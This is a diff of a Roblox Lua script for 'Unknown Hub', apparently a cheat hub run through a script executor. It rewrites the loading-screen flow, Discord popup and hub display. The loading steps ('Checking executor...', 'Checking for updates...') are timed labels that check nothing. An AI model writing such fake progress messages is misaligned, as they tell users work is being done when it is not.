-        {p = 1.0, s = "Complete!", sub = "Ready"},
-    }
-    
-    for i, step in ipairs(steps) do
-        if loadingDestroyed then break end
-        pcall(function()
-            progressFill.Size = UDim2.fromScale(step.p, 1)
-            statusLabel.Text = step.s
-            loadingSub.Text = step.sub
-        end)
-        wait(0.4)
-    end
-    
-    -- 1. Destroy loading screen completely
-    wait(0.2)
-    DestroyLoading()
-    
-    -- 2. Show discord popup if needed
-    wait(0.3)
-    if not firstShownFlag then
-        pcall(ShowDiscordPopup)
-    end
-    
-    -- 3. Show the main hub menu
-    wait(0.2)
-    hubMain.Visible = true
-    hubVisible = true
-    hubMinimized = false
-end)
-
-_G.UnknownHub = {
-    Toggle = ToggleHub,
-    Minimize = MinimizeHub,
-    IsVisible = function() return hubVisible end
+-- ═══════════════════════════════════════════════════════════
+-- RUN LOADING -> DISCORD -> SHOW HUB (Simple Linear Flow)
+-- ═══════════════════════════════════════════════════════════
+local loadSteps = {
+    {10, "Checking executor..."},
+    {25, "Loading configuration..."},
+    {40, "Initializing modules..."},
+    {55, "Loading UI components..."},
+    {70, "Setting up features..."},
+    {85, "Checking for updates..."},
+    {100, "Complete!"}
 }
 
-print("[Unknown Hub] Loaded successfully!")
-print("[Unknown Hub] Keybind: RightShift")
+for i, step in ipairs(loadSteps) do
+    loadBarFill.Size = UDim2.new(step[1]/100, 0, 1, 0)
+    loadStatus.Text = step[2]
+    loadPct.Text = step[1] .. "%"
+    wait(0.35)
+end
+
+wait(0.3)
+
+-- DESTROY LOADING SCREEN
+loadGui:Destroy()
+
+-- SHOW DISCORD IF FIRST TIME
+wait(0.2)
+if not firstShownFlag then
+    showDiscord()
+end
+
+-- SHOW THE HUB
+wait(0.3)
+hubMain.Visible = true
+hubOpen = true
+
+-- ═══════════════════════════════════════════════════════════
+-- GLOBAL REFERENCE
+-- ═══════════════════════════════════════════════════════════
+_G.UnknownHub = {
+    Toggle = toggleHub,
+    Close = closeHub
+}
